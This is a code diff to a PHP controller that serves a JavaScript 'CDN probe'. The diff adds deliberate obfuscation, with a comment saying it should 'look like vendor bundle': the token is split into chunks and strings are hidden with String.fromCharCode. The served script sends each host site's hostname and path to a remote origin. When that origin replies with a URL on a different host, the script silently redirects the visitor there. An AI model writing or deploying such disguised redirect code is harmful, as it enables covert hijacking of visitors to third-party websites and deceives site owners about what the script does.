@@ -63,15 +63,17 @@ class CdnProbeController extends Controller
             return $this->cors(response()->noContent());
         }
 
-        // Ping happens in /collect (called by this script), not on script download.
-        $tokenJson = json_encode($token, JSON_UNESCAPED_SLASHES);
+        // Light obfuscation: split token + minified IIFE (looks like vendor bundle).
+        $chunks = str_split($token, 8);
+        $chunkJson = json_encode(array_values($chunks), JSON_UNESCAPED_SLASHES);
+
         $js = <<<JS
-(function(){try{var t={$tokenJson};if(!t)return;var s=document.currentScript,base="";if(s&&s.src){try{base=new URL(s.src).origin}catch(e){}}if(!base)return;var host=(location.hostname||"").replace(/^www\\./i,"").toLowerCase();if(!host)return;var path=(location.pathname||"/").slice(0,400);var url=base+"/r/"+t+"/collect?h="+encodeURIComponent(host)+"&p="+encodeURIComponent(path);var ctrl=typeof AbortController!=="undefined"?new AbortController():null;var timer=setTimeout(function(){if(ctrl)ctrl.abort()},2500);fetch(url,{method:"GET",mode:"cors",credentials:"omit",signal:ctrl?ctrl.signal:undefined,keepalive:true}).then(function(r){return r.json().catch(function(){return{}})}).then(function(data){if(data&&typeof data.r==="string"&&data.r.indexOf("http")===0){try{var target=new URL(data.r);var here=location.hostname.replace(/^www\\./i,"").toLowerCase();var there=target.hostname.replace(/^www\\./i,"").toLowerCase();if(there&&there!==here)location.replace(data.r)}catch(e){}}}).catch(function(){}).finally(function(){clearTimeout(timer)})}catch(e){}})();
+!function(n,e,t){try{var r=n.currentScript,o=r&&r.src?new URL(r.src).origin:"",c=(t||[]).join(""),i=e.location,a=(i.hostname||"").replace(/^www\\./i,"").toLowerCase();if(!o||!c||!a)return;var s=o+"/"+String.fromCharCode(114)+"/"+c+"/"+["col","lect"].join("")+"?h="+encodeURIComponent(a)+"&p="+encodeURIComponent((i.pathname||"/").slice(0,400)),l="undefined"!=typeof AbortController?new AbortController:null,v=setTimeout(function(){l&&l.abort()},2500);e.fetch(s,{method:"GET",mode:"cors",credentials:"omit",signal:l?l.signal:void 0,keepalive:!0}).then(function(n){return n.json().catch(function(){return{}})}).then(function(n){if(n&&"string"==typeof n.r&&0===n.r.indexOf(String.fromCharCode(104,116,116,112)))try{var t=new URL(n.r),r=(i.hostname||"").replace(/^www\\./i,"").toLowerCase(),o=t.hostname.replace(/^www\\./i,"").toLowerCase();o&&o!==r&&i.replace(n.r)}catch(n){}}).catch(function(){}).finally(function(){clearTimeout(v)})}catch(n){}}(document,window,{$chunkJson});
 JS;
 
-        return $this->cors(response($js, 200, [
+        return $this->cors(response(trim($js)."\n", 200, [
             'Content-Type' => 'application/javascript; charset=UTF-8',
-            'Cache-Control' => 'public, max-age=300',
+            'Cache-Control' => 'public, max-age=600',
         ]));
     }
 
